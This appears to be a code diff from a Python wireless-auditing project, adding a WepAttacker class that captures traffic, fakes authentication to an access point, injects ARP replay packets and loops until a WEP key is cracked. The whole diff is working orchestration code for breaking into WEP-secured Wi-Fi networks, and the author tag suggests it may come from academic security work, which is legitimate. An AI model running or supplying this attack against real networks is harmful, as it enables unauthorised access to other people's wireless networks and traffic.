@@ -164,3 +164,53 @@ class WepCracker(object):
 
     def has_key(self):
         return os.path.isfile(os.path.join(self.dir_network_path, 'WEP_key.hex'))
+
+
+class WepAttacker(object):
+    """
+    Main class providing attack on WEP secured network.
+    """
+    def __init__(self, dir_network_path, ap, if_mon):
+        if not os.path.isdir(dir_network_path):
+            raise NotADirectoryError('Provided dir_network_path is not a directory.')
+        self.dir_network_path = dir_network_path
+
+        self.ap = ap
+        self.if_mon = if_mon
+        self.if_mon_mac = '00:36:76:54:b2:95'  # TODO (xvondr20) Get real MAC address of if_mon interface.
+
+    def start(self):
+        """
+        Start attack on WEP secured network.
+        :return:
+        """
+        with tempfile.TemporaryDirectory() as tmp_dirname:
+            capturer = WirelessCapturer(tmp_dir=tmp_dirname, interface=self.if_mon)
+            capturer.start(self.ap)
+
+            fake_authentication = FakeAuthentication(interface=self.if_mon, ap=self.ap, attacker_mac=self.if_mon_mac)
+            fake_authentication.start()
+
+            arp_replay = ArpReplay(interface=self.if_mon, ap=self.ap)
+            arp_replay.start(source_mac=self.if_mon_mac)
+
+            # some time to create capturecapturer.capturing_cap_path
+            time.sleep(6)
+
+            cracker = WepCracker(cap_filepath=capturer.capturing_cap_path,
+                                 ap=self.ap,
+                                 dir_network_path=self.dir_network_path)
+            cracker.start()
+
+            iv = capturer.get_iv_sum()
+
+            while not cracker.has_key():
+                time.sleep(5)
+                iv_curr = capturer.get_iv_sum()
+                if iv != iv_curr:
+                    iv = iv_curr
+                    logging.info('#IV = ' + str(iv))
+
+            capturer.stop()
+            arp_replay.stop()
+            fake_authentication.stop()
